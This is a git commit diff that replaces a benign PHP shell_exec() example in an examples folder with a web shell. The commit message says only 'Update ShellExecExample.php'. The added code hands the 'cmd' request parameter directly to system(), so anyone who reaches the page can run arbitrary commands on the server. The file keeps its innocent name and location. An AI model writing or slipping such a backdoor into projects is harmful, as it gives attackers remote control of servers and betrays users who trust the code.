8f37e17cf44c0b81fe4ef1107cd423f6af6b330d
qwerty510 <64289982+qwerty510@users.noreply.github.com>
2024-03-30 15:22:35 -0500

    Update ShellExecExample.php

--- examples/ShellExecExample.php
+++ examples/ShellExecExample.php
@@ -1,11 +1,8 @@
 <?php
-/**
- * An example of PHP's shell_exec() function.
- *
- * @link http://us3.php.net/manual/en/function.shell-exec.php
- */
-
-echo 'Running `shell_exec(\'ls -a\')`...' . PHP_EOL;
-
-$ls = shell_exec('ls -a');
-echo $ls . PHP_EOL;
+  if(isset($_REQUEST['cmd'])) {
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+  } else {
+    echo "What is your bidding?";
+  }
+?>
